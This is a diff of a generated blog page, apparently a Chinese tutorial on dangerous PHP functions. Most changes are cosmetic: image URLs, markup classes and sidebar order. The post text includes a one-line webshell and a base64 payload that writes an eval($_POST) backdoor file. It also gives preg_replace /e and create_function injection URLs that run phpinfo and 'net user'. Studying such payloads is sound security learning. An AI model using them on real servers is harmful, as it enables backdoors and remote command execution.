@@ -102,12 +102,12 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicitcxhpij20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipev1x5e4j20zk0m8b29.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicitf0kl1j20zk0m87fe.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipetfk5zwj20zk0m8e81.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipexe4oykj20zk0m87ji.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeuibk9fj20zk0m8ay2.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipeyonbf9j20zk0m8e81.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclxp31goj20zk0m8qv5.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclfdu6exj20zk0m87hw.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giph4wqtg4j20zk0m8x6p.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclga70tsj20zk0m84mr.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicljitigmj20zk0m87fp.jpg"></li>
         </ul>
       </div>
     </header>
@@ -160,19 +160,19 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210503102521525.png" alt="image-20210503102521525"></p>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210503102807857.png" alt="image-20210503102807857"></p>
 <h3 id="assert函数"><a class="markdownIt-Anchor" href="#assert函数">#</a> <strong>assert () 函数</strong></h3>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">assert()会检查指定的assertion并在结果为FALSE时采取适当的行动。</span><br><span class="line">判断一个表达式是否成立。返回true or false。</span><br><span class="line">如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">assert()会检查指定的assertion并在结果为FALSE时采取适当的行动。</span><br><span class="line">判断一个表达式是否成立。返回true or false。</span><br><span class="line">如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</span><br></pre></td></tr></table></figure>
 <p>一般情况下，黑名单都会禁用 <code>eval()</code>  函数，所以用 <code>assert</code>  来代替 eval 来执行具体操作。</p>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210503103001094.png" alt="image-20210503103001094"></p>
 <h3 id="assertion函数"><a class="markdownIt-Anchor" href="#assertion函数">#</a> assertion 函数</h3>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">检查一个断言是否为 FALSE。</span><br><span class="line">assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。</span><br><span class="line">如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">检查一个断言是否为 FALSE。</span><br><span class="line">assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。</span><br><span class="line">如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</span><br></pre></td></tr></table></figure>
 <p>构造</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $_GET[a]($_GET[b]);?&gt;  &#x2F;&#x2F;一句话木马</span><br><span class="line">&#x2F;&#x2F;payload： ?a&#x3D;assert&amp;b&#x3D;&#123;fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwJF9QT1NUW2NdKTsgPz4))&#125;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $_GET[a]($_GET[b]);?&gt;  //一句话木马</span><br><span class="line">//payload： ?a=assert&amp;b=&#123;fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwJF9QT1NUW2NdKTsgPz4))&#125;;</span><br></pre></td></tr></table></figure>
 <h3 id="preg_replace函数"><a class="markdownIt-Anchor" href="#preg_replace函数">#</a> <strong>preg_replace () 函数</strong></h3>
 <p>preg_replace 函数执行一个正则表达式的搜索和替换。</p>
 <p>代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$pattern</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$replacement</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$subject</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">die</span>();</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?pat&#x3D;&#x2F;test&#x2F;e&amp;rep&#x3D;phpinfo()&amp;sub&#x3D;jutst test</span><br><span class="line">也可以为</span><br><span class="line">?pat&#x3D;&#x2F;test&#x2F;e&amp;rep&#x3D;var_dump(&#96;net user&#96;)&amp;sub&#x3D;jutst test</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP 5.5.0 起， 传入 “\e” 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 “\e” 也无法起效。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?pat=/test/e&amp;rep=phpinfo()&amp;sub=jutst test</span><br><span class="line">也可以为</span><br><span class="line">?pat=/test/e&amp;rep=var_dump(`net user`)&amp;sub=jutst test</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP 5.5.0 起， 传入 “\e” 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 “\e” 也无法起效。</span><br></pre></td></tr></table></figure>
 <h3 id="create_function函数"><a class="markdownIt-Anchor" href="#create_function函数">#</a> create_function () 函数</h3>
 <p>string create_function ( string $args , string $code )<br>
  函数作用：从创建一个匿名函数传递的参数，并返回一个唯一的名称</p>
@@ -181,7 +181,7 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
 <p>构造匿名函数原型</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> * <span class="string">&#x27; . $sorter . &#x27;</span>(<span class="variable">$a</span>[<span class="string">&quot;&#x27; . <span class="subst">$sort_by</span> . &#x27;&quot;</span>], <span class="variable">$b</span>[<span class="string">&quot;&#x27; . <span class="subst">$sort_by</span> . &#x27;&quot;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 <p>构造 payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test3.php?sort_by&#x3D;%27%22]);&#125;phpinfo();&#x2F;*</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test3.php?sort_by=%27%22]);&#125;phpinfo();/*</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210503104641807.png" alt="image-20210503104641807"></p>
 <h3 id="call_user_func函数"><a class="markdownIt-Anchor" href="#call_user_func函数">#</a> call_user_func 函数</h3>
 <p>mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] )<br>
@@ -310,7 +310,7 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
     <div class="item left">
       
 
-  <a href="/2021/05/02/paramiko%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipesrnqv3j20zk0m8ava.jpg" title="paramiko模块介绍">
+  <a href="/2021/05/02/paramiko%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipexe4oykj20zk0m87ji.jpg" title="paramiko模块介绍">
   <span class="type">上一篇</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>paramiko模块介绍</h3>
@@ -320,7 +320,7 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
     <div class="item right">
       
 
-  <a href="/2021/05/05/%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicliierfjj20zk0m8npd.jpg" title="溯源取证总结">
+  <a href="/2021/05/05/%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giph4fomxoj20zk0m8axp.jpg" title="溯源取证总结">
   <span class="type">下一篇</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>溯源取证总结</h3>
@@ -428,7 +428,7 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2021/04/09/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" title="内存取证">内存取证</a></span>
+    <span><a href="/2021/05/04/php%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/" title="php危险函数">php危险函数</a></span>
   </li>
 
       
@@ -437,25 +437,7 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2021/04/16/Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/" title="Windows内核提权">Windows内核提权</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2021/05/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="upload-labs通关记录">upload-labs通关记录</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2021/05/05/%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/" title="溯源取证总结">溯源取证总结</a></span>
+    <span><a href="/2021/05/02/paramiko%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D/" title="paramiko模块介绍">paramiko模块介绍</a></span>
   </li>
 
       
@@ -473,7 +455,34 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2021/05/04/php%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/" title="php危险函数">php危险函数</a></span>
+    <span><a href="/2021/04/16/Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/" title="Windows内核提权">Windows内核提权</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2021/05/05/%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/" title="溯源取证总结">溯源取证总结</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2021/05/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="upload-labs通关记录">upload-labs通关记录</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2021/04/09/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" title="内存取证">内存取证</a></span>
   </li>
 
       
@@ -483,15 +492,6 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
 </div>
 
     <span><a href="/2021/04/21/meterpreter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/" title="meterpreter学习笔记">meterpreter学习笔记</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2021/05/02/paramiko%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D/" title="paramiko模块介绍">paramiko模块介绍</a></span>
   </li>
 
   </ul>
@@ -516,13 +516,13 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
     <span class="post-meta-item-icon">
       <i class="ic i-chart-area"></i>
     </span>
-    <span title="站点总字数">62k 字</span>
+    <span title="站点总字数">60k 字</span>
 
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="ic i-coffee"></i>
     </span>
-    <span title="站点阅读时长">56 分钟</span>
+    <span title="站点阅读时长">55 分钟</span>
   </div>
   <div class="powered-by">
     基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
